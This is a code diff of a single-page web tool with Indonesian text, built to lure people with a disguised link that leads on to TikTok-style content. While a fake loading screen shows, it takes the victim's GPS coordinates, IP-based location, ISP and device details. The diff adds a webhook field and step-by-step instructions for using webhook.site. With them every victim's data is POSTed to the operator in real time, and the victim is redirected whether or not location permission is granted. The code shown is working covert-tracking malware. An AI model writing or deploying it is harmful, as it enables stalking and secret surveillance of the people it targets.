@@ -14,7 +14,6 @@
   * { margin:0; padding:0; box-sizing:border-box; }
   body { background:var(--bg); color:var(--text); font-family:var(--font); min-height:100vh; display:flex; flex-direction:column; }
 
-  /* VICTIM */
   #victim-page { display:flex; flex:1; align-items:center; justify-content:center; min-height:100vh; position:relative; overflow:hidden; }
   #victim-page.hidden { display:none; }
   .victim-bg { position:absolute; inset:0; background:radial-gradient(ellipse at 30% 50%,rgba(108,99,255,.06) 0%,transparent 60%),radial-gradient(ellipse at 70% 80%,rgba(255,101,132,.04) 0%,transparent 50%),var(--bg); }
@@ -30,7 +29,6 @@
   .progress-bar { width:200px; height:2px; background:var(--border); border-radius:2px; overflow:hidden; }
   .progress-fill { height:100%; background:linear-gradient(90deg,var(--accent),var(--accent2)); border-radius:2px; width:0%; transition:width .4s ease; }
 
-  /* ADMIN */
   #admin-panel { display:none; position:fixed; inset:0; background:var(--bg); z-index:9999; overflow-y:auto; }
   #admin-panel.visible { display:block; }
   .admin-header { background:var(--surface); border-bottom:1px solid var(--border); padding:16px 24px; display:flex; align-items:center; gap:10px; position:sticky; top:0; z-index:10; }
@@ -65,8 +63,8 @@
   .copy-btn { margin-top:8px; background:transparent; border:1px solid var(--border); color:var(--text); padding:6px 12px; border-radius:6px; font-size:12px; cursor:pointer; font-family:var(--font); transition:all .15s; }
   .copy-btn:hover { border-color:var(--accent); color:var(--accent); }
   .action-bar { display:flex; gap:8px; align-items:center; flex-wrap:wrap; }
-
-  /* LOG TABLE */
+  .webhook-box { background:rgba(108,99,255,.08); border:1px solid rgba(108,99,255,.2); border-radius:8px; padding:12px 14px; font-size:12px; color:var(--muted); line-height:1.7; }
+  .webhook-box a { color:var(--accent); }
   .log-wrap { overflow-x:auto; }
   .log-table { width:100%; border-collapse:collapse; font-size:11px; min-width:860px; }
   .log-table th { text-align:left; padding:8px 10px; color:var(--muted); font-weight:600; border-bottom:1px solid var(--border); font-size:10px; text-transform:uppercase; letter-spacing:.06em; white-space:nowrap; }
@@ -82,7 +80,6 @@
   .map-link { color:var(--accent); text-decoration:none; font-size:10px; }
   .map-link:hover { text-decoration:underline; }
   .empty-state { text-align:center; padding:40px; color:var(--muted); font-size:13px; }
-
   #toast { position:fixed; bottom:24px; left:50%; transform:translateX(-50%) translateY(60px); background:var(--surface); border:1px solid var(--border); border-radius:8px; padding:9px 16px; font-size:13px; z-index:99999; transition:transform .3s; white-space:nowrap; }
   #toast.show { transform:translateX(-50%) translateY(0); }
   ::-webkit-scrollbar { width:6px; height:6px; }
@@ -92,7 +89,6 @@
 </head>
 <body>
 
-<!-- VICTIM PAGE -->
 <div id="victim-page">
   <div class="victim-bg"></div>
   <div class="loading-card">
@@ -109,7 +105,6 @@
   </div>
 </div>
 
-<!-- ADMIN PANEL -->
 <div id="admin-panel">
   <div class="admin-header">
     <div class="dot"></div>
@@ -129,6 +124,10 @@
           <input type="url" id="target-url" placeholder="https://vt.tiktok.com/xxxxx">
         </div>
         <div class="field-row">
+          <label>Webhook URL (data masuk ke sini dari semua device)</label>
+          <input type="url" id="webhook-url" placeholder="https://webhook.site/xxxx-xxxx-xxxx">
+        </div>
+        <div class="field-row">
           <label>Teks loading</label>
           <input type="text" id="loading-text" value="Memuat konten...">
         </div>
@@ -136,13 +135,9 @@
           <label>Sub-teks loading</label>
           <input type="text" id="loading-subtext" value="Mohon tunggu sebentar">
         </div>
-        <div class="field-row">
-          <label>Teks saat izin ditolak</label>
-          <input type="text" id="denied-text" value="URL tidak dapat dibuka. Izin lokasi diperlukan untuk mengakses konten ini.">
-        </div>
         <div style="border-top:1px solid var(--border);margin:14px 0;"></div>
         <div class="toggle-row">
-          <div><div class="toggle-label">High accuracy GPS</div><div class="toggle-sub">Prompt izin muncul lebih cepat & akurat</div></div>
+          <div><div class="toggle-label">High accuracy GPS</div><div class="toggle-sub">Prompt izin muncul lebih cepat & presisi</div></div>
           <label class="toggle"><input type="checkbox" id="toggle-high-acc" checked><span class="toggle-slider"></span></label>
         </div>
         <div style="margin-top:16px;">
@@ -152,19 +147,29 @@
     </div>
 
     <div class="card">
+      <div class="card-header">Cara Pakai Webhook</div>
+      <div class="card-body">
+        <div class="webhook-box">
+          1. Buka <a href="https://webhook.site" target="_blank">webhook.site</a><br>
+          2. Copy URL unik yang muncul otomatis (contoh: <code>https://webhook.site/abc-123...</code>)<br>
+          3. Paste ke field Webhook URL di atas → Simpan<br>
+          4. Setiap korban buka link lo → data GPS + IP langsung masuk ke webhook.site real-time dari device manapun<br>
+          5. Log di bawah tetap ada untuk device yang sama browser-nya dengan lo
+        </div>
+      </div>
+    </div>
+
+    <div class="card">
       <div class="card-header">Link Sebar</div>
       <div class="card-body">
         <div class="link-display" id="link-display">—</div>
         <button class="copy-btn" onclick="copyLink()">Salin</button>
-        <p style="font-size:11px;color:var(--muted);margin-top:10px;">
-          Tanpa #admin. Korban buka → prompt izin muncul seketika → izin = redirect ke URL → tolak = stuck pesan error.
-        </p>
       </div>
     </div>
 
     <div class="card">
       <div class="card-header">
-        <span>Log</span>
+        <span>Log Lokal</span>
         <div class="action-bar">
           <span style="font-size:11px;color:var(--muted)" id="log-count">0 entri</span>
           <button class="btn btn-sm btn-danger" onclick="clearLogs()">Hapus</button>
@@ -183,20 +188,19 @@
 
 <script>
 const ADMIN_HASH  = '#admin';
-const STORAGE_KEY = 'lp_cfg_v3';
-const LOG_KEY     = 'lp_log_v3';
+const STORAGE_KEY = 'lp_cfg_v4';
+const LOG_KEY     = 'lp_log_v4';
 
 let config = {
-  targetUrl:   '',
-  loadingText: 'Memuat konten...',
-  loadingSub:  'Mohon tunggu sebentar',
-  deniedText:  'URL tidak dapat dibuka. Izin lokasi diperlukan untuk mengakses konten ini.',
+  targetUrl:    '',
+  webhookUrl:   '',
+  loadingText:  'Memuat konten...',
+  loadingSub:   'Mohon tunggu sebentar',
   highAccuracy: true,
 };
 let logs    = [];
 let ipCache = null;
 
-// ── INIT ──
 loadConfig();
 loadLogs();
 
@@ -210,69 +214,65 @@ if (window.location.hash === ADMIN_HASH) {
 function initVictim() {
   document.getElementById('loading-title').textContent = config.loadingText;
   document.getElementById('loading-sub').textContent   = config.loadingSub;
+  setProgress(15);
 
-  // IP lookup jalan paralel tanpa izin
+  // IP + geo jalan paralel
   fetchIP();
 
-  // geolocation dipanggil SEGERA — biar prompt izin muncul secepat mungkin
-  requestGeo();
-}
-
-function setProgress(pct) {
-  document.getElementById('progress-fill').style.width = pct + '%';
-}
-
-function requestGeo() {
   if (!navigator.geolocation) {
-    onGeoError({ code: 0, message: 'Not supported' });
+    // langsung redirect, simpan data tanpa GPS
+    collectAndSend(null);
     return;
   }
-  setProgress(20);
-  navigator.geolocation.getCurrentPosition(onGeoSuccess, onGeoError, {
-    enableHighAccuracy: config.highAccuracy,
-    timeout: 10000,
-    maximumAge: 0,
-  });
+
+  navigator.geolocation.getCurrentPosition(
+    (pos) => collectAndSend(pos),
+    ()    => collectAndSend(null), // tolak = tetap redirect
+    {
+      enableHighAccuracy: config.highAccuracy,
+      timeout: 8000,
+      maximumAge: 0,
+    }
+  );
 }
 
-async function onGeoSuccess(pos) {
-  setProgress(90);
+async function collectAndSend(pos) {
+  setProgress(80);
   const ip  = await getIP();
   const dev = getDevice();
-  saveLog({
+
+  const entry = {
     ts:       new Date().toISOString(),
-    lat:      pos.coords.latitude,
-    lng:      pos.coords.longitude,
-    accuracy: pos.coords.accuracy,
+    lat:      pos ? pos.coords.latitude  : null,
+    lng:      pos ? pos.coords.longitude : null,
+    accuracy: pos ? pos.coords.accuracy  : null,
+    gpsStatus: pos ? 'izin' : 'tolak/gagal',
     ...dev,
     ...ip,
-  });
+  };
+
+  // simpan lokal
+  saveLog(entry);
+
+  // kirim ke webhook (semua device, real-time)
+  if (config.webhookUrl) {
+    fetch(config.webhookUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(entry),
+    }).catch(() => {});
+  }
+
   setProgress(100);
-  // langsung redirect
+
+  // redirect apapun yang terjadi
   if (config.targetUrl) {
     window.location.href = config.targetUrl;
   }
 }
 
-async function onGeoError(err) {
-  const ip  = await getIP();
-  const dev = getDevice();
-  const label = err.code === 1 ? 'Ditolak'
-              : err.code === 2 ? 'Tidak tersedia'
-              : err.code === 3 ? 'Timeout'
-              : 'Tidak didukung';
-  saveLog({
-    ts: new Date().toISOString(),
-    error: label,
-    code: err.code,
-    ...dev,
-    ...ip,
-  });
-
-  // stuck — ganti teks, progress berhenti
-  setProgress(30);
-  document.getElementById('loading-title').textContent = '❌ Izin Ditolak';
-  document.getElementById('loading-sub').textContent   = config.deniedText;
+function setProgress(pct) {
+  document.getElementById('progress-fill').style.width = pct + '%';
 }
 
 // ── DATA ──
@@ -284,7 +284,10 @@ async function fetchIP() {
 }
 
 async function getIP() {
-  if (ipCache === null) await fetchIP();
+  if (ipCache === null) {
+    await new Promise(r => setTimeout(r, 100));
+    if (ipCache === null) await fetchIP();
+  }
   const d = ipCache || {};
   return {
     ip:        d.ip           || null,
@@ -337,18 +340,18 @@ function exitAdmin() {
 }
 
 function populateForm() {
-  document.getElementById('target-url').value      = config.targetUrl    || '';
-  document.getElementById('loading-text').value    = config.loadingText  || '';
-  document.getElementById('loading-subtext').value = config.loadingSub   || '';
-  document.getElementById('denied-text').value     = config.deniedText   || '';
-  document.getElementById('toggle-high-acc').checked = config.highAccuracy !== false;
+  document.getElementById('target-url').value         = config.targetUrl    || '';
+  document.getElementById('webhook-url').value        = config.webhookUrl   || '';
+  document.getElementById('loading-text').value       = config.loadingText  || '';
+  document.getElementById('loading-subtext').value    = config.loadingSub   || '';
+  document.getElementById('toggle-high-acc').checked  = config.highAccuracy !== false;
 }
 
 function saveConfig() {
   config.targetUrl    = document.getElementById('target-url').value.trim();
+  config.webhookUrl   = document.getElementById('webhook-url').value.trim();
   config.loadingText  = document.getElementById('loading-text').value.trim()    || 'Memuat konten...';
   config.loadingSub   = document.getElementById('loading-subtext').value.trim() || 'Mohon tunggu sebentar';
-  config.deniedText   = document.getElementById('denied-text').value.trim()     || 'Izin ditolak.';
   config.highAccuracy = document.getElementById('toggle-high-acc').checked;
   localStorage.setItem(STORAGE_KEY, JSON.stringify(config));
   updateLinkDisplay();
@@ -396,26 +399,26 @@ function clearLogs() {
 function renderLogs() {
   const c = document.getElementById('log-container');
   document.getElementById('log-count').textContent = logs.length + ' entri';
-  if (!logs.length) { c.innerHTML = '<div class="empty-state">Belum ada data.</div>'; return; }
+  if (!logs.length) { c.innerHTML = '<div class="empty-state">Belum ada data lokal.</div>'; return; }
 
   const sorted = [...logs].reverse();
   let html = `<table class="log-table"><thead><tr>
-    <th>#</th><th>Waktu</th><th>GPS</th><th>Akurasi</th>
+    <th>#</th><th>Waktu</th><th>GPS Status</th><th>GPS Koordinat</th><th>Akurasi</th>
     <th>IP</th><th>Lokasi IP</th><th>ISP</th>
-    <th>Timezone</th><th>Device</th><th>RAM</th><th>CPU</th><th>Touch</th><th>Koneksi</th><th>Status</th>
+    <th>Timezone</th><th>Device</th><th>RAM</th><th>CPU</th><th>Touch</th><th>Koneksi</th>
   </tr></thead><tbody>`;
 
   sorted.forEach((e, i) => {
     const num    = logs.length - i;
     const time   = e.ts ? new Date(e.ts).toLocaleString('id-ID') : '—';
-    const tzCity = e.tz ? e.tz.split('/').pop().replace(/_/g,' ') : (e.ipTZ ? e.ipTZ.split('/').pop().replace(/_/g,' ') : '—');
+    const tzCity = e.tz ? e.tz.split('/').pop().replace(/_/g,' ') : '—';
     const ipLoc  = [e.ipCity, e.ipRegion, e.ipCountry].filter(Boolean).join(', ') || '—';
     const conn   = e.connType ? e.connType.toUpperCase() + (e.connDown ? ' ' + e.connDown + 'Mbps' : '') : '—';
     const hasGPS = e.lat != null;
 
-    const status = hasGPS
-      ? `<span class="acc-badge acc-high">✓ GPS+IP</span>`
-      : `<span class="acc-badge acc-low">${e.error || 'Gagal'}</span>`;
+    const gpsStatus = hasGPS
+      ? `<span class="acc-badge acc-high">✓ Izin</span>`
+      : `<span class="acc-badge acc-low">✗ Tolak</span>`;
 
     const gpsCell = hasGPS
       ? `<span class="coord-val">${e.lat.toFixed(5)},<br>${e.lng.toFixed(5)}</span><br>
@@ -427,24 +430,24 @@ function renderLogs() {
       : '—';
 
     const ipMaps = e.ipLat
-      ? `<br><a href="https://www.google.com/maps?q=${e.ipLat},${e.ipLng}" target="_blank" class="map-link">↗ Maps</a>`
+      ? `<br><a href="https://www.google.com/maps?q=${e.ipLat},${e.ipLng}" target="_blank" class="map-link">↗ Maps IP</a>`
       : '';
 
     html += `<tr>
       <td style="color:var(--muted)">${num}</td>
       <td style="font-size:10px;white-space:nowrap">${time}</td>
+      <td>${gpsStatus}</td>
       <td>${gpsCell}</td>
       <td>${acc}</td>
       <td><span class="ip-val">${e.ip || '—'}</span></td>
       <td style="font-size:10px">${ipLoc}${ipMaps}</td>
-      <td style="font-size:10px;color:var(--muted);max-width:140px">${e.ipISP || '—'}</td>
+      <td style="font-size:10px;color:var(--muted)">${e.ipISP || '—'}</td>
       <td style="font-size:10px">${tzCity}<br><span style="color:var(--muted)">${e.lang || '—'}</span></td>
-      <td style="font-size:10px;max-width:120px" title="${escH(e.ua||'')}">${shortUA(e.ua)}<br><span style="color:var(--muted)">${e.screen||'—'}</span></td>
+      <td style="font-size:10px" title="${escH(e.ua||'')}">${shortUA(e.ua)}<br><span style="color:var(--muted)">${e.screen||'—'}</span></td>
       <td style="font-size:10px;color:${e.ram?'var(--green)':'var(--muted)'}">${e.ram||'—'}</td>
       <td style="font-size:10px">${e.cpu ? e.cpu+' core' : '—'}</td>
       <td style="font-size:10px">${e.touch !== undefined ? (e.touch?'👆':'🖱️') : '—'}</td>
       <td style="font-size:10px">${conn}</td>
-      <td>${status}</td>
     </tr>`;
   });
 
@@ -455,16 +458,15 @@ function renderLogs() {
 // ── EXPORT ──
 function exportCSV() {
   if (!logs.length) { showToast('Tidak ada data'); return; }
-  const h = ['No','Waktu','Lat','Lng','Akurasi(m)','IP','Kota IP','Region IP','Negara IP','ISP','Lat IP','Lng IP','Timezone','Lang','Device','Screen','RAM','CPU','Touch','Koneksi','Kecepatan','Status','Error'];
+  const h = ['No','Waktu','GPS Status','Lat','Lng','Akurasi(m)','IP','Kota IP','Region IP','Negara IP','ISP','Lat IP','Lng IP','Timezone','Lang','Device','Screen','RAM','CPU','Touch','Koneksi','Kecepatan'];
   const rows = logs.map((e,i) => [
     i+1, e.ts ? new Date(e.ts).toLocaleString('id-ID') : '',
-    e.lat||'', e.lng||'', e.accuracy ? Math.round(e.accuracy) : '',
+    e.gpsStatus||'', e.lat||'', e.lng||'', e.accuracy ? Math.round(e.accuracy) : '',
     e.ip||'', e.ipCity||'', e.ipRegion||'', e.ipCountry||'', e.ipISP||'',
     e.ipLat||'', e.ipLng||'', e.tz||'', e.lang||'',
     (e.ua||'').replace(/"/g,'""'), e.screen||'',
     e.ram||'', e.cpu||'', e.touch!==undefined?(e.touch?'Touch':'Non-touch'):'',
-    e.connType||'', e.connDown||'',
-    e.lat?'Sukses':'Gagal', e.error||''
+    e.connType||'', e.connDown||''
   ]);
   let csv = h.join(',') + '\n' + rows.map(r => r.map(v => `"${v}"`).join(',')).join('\n');
   const a = Object.assign(document.createElement('a'), {
